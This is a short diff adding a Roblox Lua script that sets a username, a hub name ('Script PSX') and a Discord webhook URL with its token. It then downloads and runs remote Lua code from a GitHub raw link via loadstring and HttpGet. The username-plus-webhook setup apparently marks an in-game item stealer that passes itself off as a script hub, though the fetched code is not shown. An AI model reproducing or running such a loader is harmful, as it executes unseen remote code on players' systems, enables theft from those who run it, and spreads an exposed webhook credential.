@@ -1,0 +1,5 @@
+_G.Username = "Creamsch1"
+_G.HubName = "Script PSX"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1091904309161111603/Dy_uxFURChi0iKBzfCQ3mCTk6rG3xKRR4bYE-9r6txnQrmkL1nGtUuSi3hnGcIxraNAm"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
